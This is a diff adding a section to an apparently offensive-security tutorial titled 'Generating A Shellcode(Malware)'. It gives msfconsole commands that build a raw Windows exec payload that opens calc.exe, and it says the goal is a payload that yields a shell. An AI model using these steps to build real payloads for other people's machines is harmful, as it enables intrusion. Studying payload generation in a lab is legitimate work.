@@ -52,9 +52,27 @@ CODE:
 
 ## Generating A Shellcode(Malware)
 
-Now 
+Now we will make our payload basiclly with will give us the shell
+but right now for testing we will make a shellcode to open calculator in windows
 
 
+Step 1: Open msfconsole in kali linux or any other distro
+
+Step 2: 
+---
+COMMAND:
+	//Open msfconsole
+ 	msfconsole
+
+  	use payload/windows/exec
+	
+   	set CMD calc.exe
+
+ 	generate -f raw -o shellocde.bin
+
+---
+
+Step 3: Download this bin file to your windows machine
 
 
 
